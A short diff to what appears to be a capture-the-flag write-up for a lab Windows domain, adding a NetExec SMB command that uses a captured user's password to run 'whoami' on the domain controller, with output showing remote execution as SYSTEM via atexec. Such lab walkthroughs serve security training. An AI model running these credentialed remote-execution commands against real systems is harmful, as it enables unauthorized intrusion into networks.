@@ -994,7 +994,11 @@ SMB         10.129.32.165   445    DC               [+] office.htb\john:H4x00r12
 This user has a pwned indicator which tells me this worked!
 
 ```python
-
+nxc smb dc.office.htb -u john -p 'H4x00r123..' -X 'whoami'
+SMB         10.129.32.165   445    DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:office.htb) (signing:True) (SMBv1:None)
+SMB         10.129.32.165   445    DC               [+] office.htb\john:H4x00r123.. (Pwn3d!)
+SMB         10.129.32.165   445    DC               [+] Executed command via atexec
+SMB         10.129.32.165   445    DC               nt authority\system
 ```
 
 ```python
